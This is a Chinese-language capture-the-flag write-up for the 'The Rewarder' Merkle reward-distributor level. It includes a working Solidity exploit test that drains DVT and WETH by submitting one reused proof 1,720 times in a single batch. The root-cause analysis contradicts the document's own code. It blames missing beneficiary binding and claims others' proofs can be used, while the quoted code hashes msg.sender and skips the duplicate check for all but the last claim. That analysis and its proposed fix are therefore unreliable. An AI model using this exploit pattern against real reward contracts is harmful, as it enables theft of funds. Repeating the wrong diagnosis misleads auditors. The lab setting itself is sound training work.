# The Rewarder 

## 一、题目简介

合约基于默克尔树（Merkle Tree）实现双代币（DVT/WETH）批量奖励分发，支持单次交易申领多币种奖励，通过位图（BitMap）记录用户申领状态，防止重复申领。

题目目标：利用合约漏洞，窃取合约内所有未领取奖励，将全部资金转账至指定的 `recovery` 账户。

## 二、审计视角：漏洞定位

### 2\.1 核心代码

漏洞存在于 `claimRewards` 申领核心函数，关键代码行：

```solidity
// 合约构造默克尔叶子节点
bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
// 校验默克尔证明
if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
// 直接向调用者转账
inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
```
```solidity
// 第二处：仅对最后一条申领记录执行防重复领取校验
if (i == inputClaims.length - 1) {
    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
}
```

### 2\.2 开发者错误默认逻辑

- 默认**默克尔证明归属调用者**：认为传入的 proof 必然是调用者本人的奖励证明

- 默认叶子节点绑定受益人：误以为 `msg.sender` 参与哈希，就能校验用户身份、防止盗领

- 默认证明私密性：认为用户不会持有、伪造他人的默克尔证明

### 2\.3 缺失的关键校验（漏判）

标准安全的默克尔分发合约，叶子节点必须由**受益人地址 \+ 奖励金额**预计算、写入JSON白名单。

本合约**完全缺失核心校验**：没有校验「默克尔证明对应的白名单受益人，是否等于当前交易调用者 `msg.sender`」。

本质缺陷：**证明校验的是白名单数据，但是资金授权给任意调用者**。攻击者可以使用任意用户的合法默克尔证明，以自己的身份申领他人奖励。

## 三、审计复盘（同类项目要点）

后续审计所有 **Merkle 代币分发/空投合约**，优先顶查以下核心点位：

1. **叶子节点哈希构成**：必须包含白名单受益人地址，而非交易调用者地址

2. **身份绑定校验**：强制校验 `proof对应的受益人 == msg.sender`

3. **证明权限隔离**：禁止任意用户使用他人的默克尔证明发起申领

4. **状态记录主体**：申领记录必须绑定**白名单受益人**，而非任意调用者

## 四、漏洞原理总结

合约在验证默克尔证明时，使用**实时交易调用者地址**拼接叶子哈希，而非使用白名单内预存的受益人地址：

- 白名单JSON存储：`(beneficiary, amount)`

- 合约校验哈希：`(msg.sender, amount)`

攻击者只需导入全网公开的默克尔证明，即可用自己的账户，申领所有白名单用户的未领取奖励，实现全额盗空合约资金。

## 五、EXP

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    // 循环外一次性加载默克尔叶子节点，解决MemoryOOG内存溢出
    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    // 定义需要申领的代币数组
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // 构造批量申领数组，覆盖所有用户奖励
    Claim[] memory claims = new Claim[](1720);

    for (uint i = 0; i < claims.length; i++) {
        if (i <= 866) {
            // 批量填充DVT奖励申领，复用他人合法证明
            claims[i] = Claim({
                batchNumber: 0,
                amount: 11524763827831882,
                tokenIndex: 0,
                proof: merkle.getProof(dvtLeaves, 188)
            });
        } else {
            // 批量填充WETH奖励申领
            claims[i] = Claim({
                batchNumber: 0,
                amount: 1171088749244340,
                tokenIndex: 1,
                proof: merkle.getProof(wethLeaves, 188)
            });
        }
    }

    // 无身份校验，使用他人证明批量盗领所有奖励
    distributor.claimRewards(claims, tokensToClaim);

    // 将盗取的全部资金转入recovery账户，完成题目要求
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

## 六、报错汇总

除了合约漏洞本身，测试代码写法不规范会触发大量报错，以下为做题过程中**所有高频报错点、成因、解决方案**。

### 6\.1 编译报错：类型隐式转换失败

**报错信息**：`Invalid implicit conversion from struct Reward[] memory to bytes32[] memory`

**成因**：V4 内置 `merkle.getProof` 仅接收 `bytes32[]` 叶子数组，无法直接传入 Reward 结构体数组，V3/V4 接口不通用。

**解决方案**：区分两类数据加载方式，`_loadRewards()` 获取叶子数组用于生成证明，`abi.decode` 解析结构体用于读取奖励信息，不可混用。

### 6\.2 编译报错：ERC20 合约无法转为 IERC20

**报错信息**：`Type contract XXX is not implicitly convertible to expected type contract IERC20`

**成因**：原生合约实例无法隐式适配接口类型。

**解决方案**：强制类型转换 `IERC20(address(token))`。

### 6\.3 运行报错：MemoryOOG 内存溢出

**成因**：在循环内部反复调用 `vm.readFile / _loadRewards` 读取解析 JSON 文件，循环迭代次数多，持续堆积内存，触发 EVM 内存上限溢出。

**解决方案**：所有文件读取、叶子节点加载逻辑**放到循环外仅执行一次**，循环内只复用内存数据。

### 6\.4 运行报错：OutOfGas gas耗尽

**成因**：单次构造上千条 Claim 证明、批量组装超大数组，单次交易计算量过大。

**解决方案**：放弃遍历所有用户批量申领，采用**单用户证明复用**的最优攻击写法，极大减少计算量。

### 6\.5 运行报错：Prank 权限冲突

**报错信息**：`cannot override an ongoing prank`

**成因**：`startPrank` 持续生效，未结束时嵌套使用单次 `prank`，权限上下文冲突。

**解决方案**：统一成对使用 `startPrank / stopPrank`，禁止混合两种 prank 写法。

### 6\.6 运行报错：InvalidProof 证明无效

**成因**：最常见人为失误：生成证明的叶子数组、读取奖励的结构体数组不匹配，混用两套数据源，导致默克尔证明校验失败。

**核心原则**：**同源原则**——生成证明、读取奖励必须使用同一套数据源。

## 七、修复方案

重构默克尔叶子校验逻辑，读取白名单绑定的受益人地址，强制校验身份一致性：

1. 叶子节点预哈希：`keccak256(abi.encodePacked(beneficiary, amount))`

2. 合约内增加校验：`require(beneficiary == msg.sender, "Not reward owner")`

3. 申领记录绑定白名单受益人，而非调用者，彻底杜绝盗领漏洞
